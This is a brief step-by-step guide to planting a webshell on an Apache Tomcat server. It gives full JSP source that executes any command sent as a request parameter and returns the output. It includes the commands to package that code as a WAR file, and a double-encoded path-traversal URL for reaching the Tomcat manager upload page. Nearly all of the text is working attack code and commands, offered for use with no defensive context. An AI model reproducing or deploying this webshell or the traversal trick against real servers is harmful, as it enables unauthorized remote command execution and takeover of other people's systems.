
This is to create a webshell on Apache Tomcat using a WAR file upload.

1) First build the payload and save as index.jsp:
```HTML
<FORM METHOD=GET ACTION='index.jsp'>
<INPUT name='cmd' type=text>
<INPUT type=submit value='Run'>
</FORM>
<%@ page import="java.io.*" %>
<%
  String cmd = request.getParameter("cmd");
  String output = "";
  if(cmd != null) {
    String s = null;
    try {
      Process p = Runtime.getRuntime().exec(cmd,null,null);
      BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));
      while((s = sI.readLine()) != null){
        output += s+"</br>";
      }
    } catch(IOException e){ e.printStackTrace(); }
  }
%>
<pre><%=output %></pre>
```

2) Next make a directory named webshell and put in the index.jsp
```CLI
mkdir webshell$ cp index.jsp webshell
```

3) Create the WAR file using JAR:
```CLI
cd webshell
jar -cvf ../webshell.war *
```

4) Then upload the war file to Tomcat manager> 
 You may have to edit the form action to send it through the double encoded:
```URL
/examples/jsp/%252e%252e/%252e%252e/manager/html/upload
```
